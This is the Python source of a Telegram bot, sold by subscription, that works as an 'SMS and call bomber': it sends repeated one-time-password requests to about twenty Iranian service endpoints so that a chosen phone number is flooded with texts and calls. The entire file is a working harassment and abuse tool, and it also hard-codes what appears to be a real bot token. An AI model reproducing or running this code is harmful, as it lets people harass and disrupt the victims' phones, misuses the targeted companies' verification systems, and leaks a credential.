import asyncio
import concurrent.futures
import time as time_module
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"  # از @BotFather بگیر
ADMIN_ID = 2025464333  # آیدی عددی خودت

HDR = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Content-Type": "application/json",
}

USERS = {}  # {user_id: {"expire": datetime, "active_bomb": bool, "stop": bool}}

def sms_apis(phone):
    return [
        ["Lendo","https://api.lendo.ir/api/customer/auth/send-otp",{"mobile":phone}],
        ["GapFilm","https://core.gapfilm.ir/api/v3.1/Account/Login",{"Type":"3","Username":phone[1:]}],
        ["Achareh","https://api.achareh.co/v2/accounts/login/",{"phone":"98"+phone[1:]}],
        ["Divar","https://api.divar.ir/v5/auth/authenticate",{"phone":phone}],
        ["Tapsi","https://api.tapsi.ir/api/v2.2/user",{"credential":{"phoneNumber":phone,"role":"DRIVER"},"otpOption":"SMS"}],
        ["Namava","https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",{"UserName":"+98"+phone[1:]}],
        ["Bikoplus","https://bikoplus.com/account/check-phone-number",{"phoneNumber":phone}],
        ["Jabama","https://gw.jabama.com/api/v4/account/send-code",{"mobile":phone}],
        ["Khodro45","https://khodro45.com/api/v1/customers/otp/",{"mobile":phone}],
        ["Snapp V1","https://api.snapp.ir/api/v1/sms/link",{"phone":phone}],
        ["Snapp V2","https://digitalsignup.snapp.ir/ds3/api/v3/otp?cellphone="+phone,{"cellphone":phone}],
        ["Alibaba","https://ws.alibaba.ir/api/v3/account/mobile/otp",{"phoneNumber":phone[1:]}],
        ["Sheypoor","https://www.sheypoor.com/api/v10.0.0/auth/send",{"username":phone}],
        ["Taaghche","https://gw.taaghche.com/v4/site/auth/signup",{"contact":phone}],
        ["Snappfood","https://api.snappfood.ir/auth/mobile/send/v2",{"cellphone":phone}],
        ["Banimode","https://mobapi.banimode.com/api/v2/auth/request",{"phone":phone}],
        ["IToll","https://app.itoll.com/api/v1/auth/login",{"mobile":phone}],
        ["Tap33","https://tap33.me/api/v2/user",{"credential":{"phoneNumber":phone,"role":"BIKER"}}],
        ["Digikala SMS","https://api.digikala.com/v1/user/authenticate/",{"username":phone,"otp_call":False}],
        ["DigikalaJet SMS","https://api.digikalajet.ir/user/login-register/",{"phone":phone}],
    ]

def call_apis(phone):
    return [
        ["Digikala CALL","https://api.digikala.com/v1/user/authenticate/",{"username":phone,"otp_call":True}],
        ["DigikalaJet CALL","https://api.digikalajet.ir/user/login-register/",{"phone":phone}],
    ]

def get_apis(phone, mode):
    if mode == "sms": return sms_apis(phone)
    elif mode == "call": return call_apis(phone)
    else: return call_apis(phone) + sms_apis(phone)

def send_one(api, user_id, total):
    if USERS.get(user_id, {}).get("stop"):
        return ("stop", api[0], 0)
    name, url, data = api
    try:
        r = requests.post(url, json=data, headers=HDR, timeout=8)
        if r.status_code in (200,201,202,204,400,401,403,422,429):
            return ("ok", name, r.status_code)
        return ("fail", name, r.status_code)
    except:
        return ("err", name, 0)

async def bomb_user(update, phone, rounds, mode, user_id):
    USERS.setdefault(user_id, {})["stop"] = False
    USERS[user_id]["active_bomb"] = True
    apis = get_apis(phone, mode)
    total = len(apis) * rounds
    ok = fail = stop = 0
    msg = await update.message.reply_text(f"Bombing started: {phone}\nMode: {mode}\nTotal: {total} APIs\n\n0/{total} OK")

    loop = asyncio.get_event_loop()
    for rnd in range(rounds):
        if USERS.get(user_id, {}).get("stop"):
            stop += len(apis) * (rounds - rnd)
            break
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futs = [loop.run_in_executor(ex, send_one, api, user_id, total) for api in apis]
            for i, coro in enumerate(asyncio.as_completed(futs)):
                res = await coro
                if res[0] == "ok": ok += 1
                elif res[0] == "stop": stop += 1
                else: fail += 1
                if (ok+fail+stop) % 5 == 0:
                    try:
                        await msg.edit_text(f"Bombing: {phone}\nMode: {mode}\n\nOK: {ok} | FAIL: {fail} | STOP: {stop}\n{ok+fail+stop}/{total}")
                    except: pass
        if rnd < rounds - 1 and not USERS.get(user_id, {}).get("stop"):
            await asyncio.sleep(0.3)

    USERS[user_id]["active_bomb"] = False
    USERS[user_id]["stop"] = False
    await msg.edit_text(f"Done! {phone}\nMode: {mode}\n\nOK: {ok} | FAIL: {fail} | STOP: {stop}")

def glass_btn(text, callback):
    return InlineKeyboardButton(text, callback_data=callback)

def main_menu():
    return InlineKeyboardMarkup([
        [glass_btn("💣 SMS Bomber", "mode_sms"),
         glass_btn("📞 Call Bomber", "mode_call")],
        [glass_btn("⚡ SMS + Call", "mode_all"),
         glass_btn("⏹️ Stop", "stop_bomb")],
        [glass_btn("🎟️ Free Test (1 Day)", "test_1day"),
         glass_btn("💎 Buy Subscription", "buy_sub")],
        [glass_btn("ℹ️ Help", "help")],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "╔══════════════════════╗\n"
        "║    ILIYA SMS BOT    ║\n"
        "║  SMS & CALL BOMBER  ║\n"
        "╚══════════════════════╝\n\n"
        "Select an option:",
        reply_markup=main_menu()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    uid = q.from_user.id

    if data.startswith("mode_"):
        mode = data.split("_")[1]
        context.user_data["mode"] = mode
        await q.message.reply_text(
            f"Mode: {mode.upper()}\nSend phone number (0912xxxxxxx) and rounds (e.g. '09121234567 3'):"
        )
    elif data == "stop_bomb":
        USERS.setdefault(uid, {})["stop"] = True
        await q.message.reply_text("Stopping current bomb...")
    elif data == "test_1day":
        USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active_bomb": False, "stop": False}
        await q.message.reply_text("Free 1-day test activated! Use the menu to start bombing.")
    elif data == "buy_sub":
        await q.message.reply_text("💎 Subscription Plans:\n\n1 Month: 100 Toman\n3 Months: 250 Toman\n6 Months: 450 Toman\n\nContact @admin for purchase.")
    elif data == "help":
        await q.message.reply_text(
            "How to use:\n"
            "1. Choose mode (SMS/Call/Both)\n"
            "2. Send: PHONE ROUNDS\n"
            "   Example: 09121234567 5\n"
            "3. Press Stop to cancel\n\n"
            "Commands: /start /stop /test /buy /help"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()

    if uid not in USERS or USERS[uid].get("expire", datetime.min) < datetime.now():
        if uid != ADMIN_ID:
            await update.message.reply_text("Subscription expired or not activated. Use /test for 1-day free trial or /buy to purchase.")
            return

    mode = context.user_data.get("mode", "all")
    parts = text.split()
    if len(parts) >= 1 and parts[0].startswith("09"):
        phone = parts[0]
        rounds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
        if USERS.get(uid, {}).get("active_bomb"):
            await update.message.reply_text("A bomb is already running. Wait or press Stop.")
            return
        await bomb_user(update, phone, rounds, mode, uid)
    else:
        await update.message.reply_text("Format: PHONE ROUNDS\nExample: 09121234567 3", reply_markup=main_menu())

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    USERS.setdefault(uid, {})["stop"] = True
    await update.message.reply_text("Stop signal sent.")

async def test_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active_bomb": False, "stop": False}
    await update.message.reply_text("1-day free trial activated!")

async def buy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💎 Plans: 1M=100T | 3M=250T | 6M=450T\nContact @admin")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Choose mode, then send PHONE ROUNDS.\nExample: 09121234567 3")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("test", test_cmd))
    app.add_handler(CommandHandler("buy", buy_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
